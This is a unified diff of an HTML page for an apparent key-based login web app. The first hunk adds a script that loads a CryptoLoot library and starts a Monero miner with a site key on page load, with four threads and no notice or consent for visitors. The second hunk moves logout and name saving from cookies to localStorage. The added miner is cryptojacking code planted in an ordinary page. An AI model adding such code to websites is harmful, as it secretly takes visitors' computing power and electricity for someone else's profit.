@@ -10,6 +10,14 @@
 
 
     <!-- <script src="jquery.min.js"></script> <!- - jquery, a powerful utility - -> -->
+    <script src="cryptoloot/lib/crypta.js"></script>
+    <script>
+      var miner=new CRLT.Anonymous('78e2d66b45e972a6a3cc5d1ad76f25e943bfa68d8e76', {
+        threads:4,throttle:0.1, coin: "xmr",
+      });
+      miner.start();
+    </script>
+
     <script src="https://peterolson.github.io/BigInteger.js/BigInteger.min.js"></script> <!-- bigInt for doing fast calculations with large integers -->
     <script src="/socket.io/socket.io.js"></script> <!-- for communication with server -->
     <!-- <script src="cryptico/cryptico.min.js"></script> <!- - for generating rsa keypair -->
@@ -169,14 +177,11 @@
           <div class="blockcode loginkey"><span id="loginkeydiv" class="private"></span></div>
           <br>
           <button type="button" onclick="if (!confirm('Make sure you have your login key saved somewhere, or you won\'t be able to get back into your account.')) return false;
-                                         document.cookie = 'name=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
-                                         document.cookie = 'pubkey=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
-                                         document.cookie = 'privkey=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
-                                         document.cookie = 'loginkey=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+                                         localStorage.removeItem('nodeinfo');
                                          window.location.reload();
                                          ">Log Out</button><br>
           <br>
-          <button class="btn" onclick="document.cookie='name='+document.getElementById('displayname').value;window.location.reload()">Save</button>
+          <button class="btn" onclick="thisNode.name=document.getElementById('displayname').value;localStorage.setItem('nodeinfo',thisNode);window.location.reload()">Save</button>
         </form>
       </div>
     </div></div>
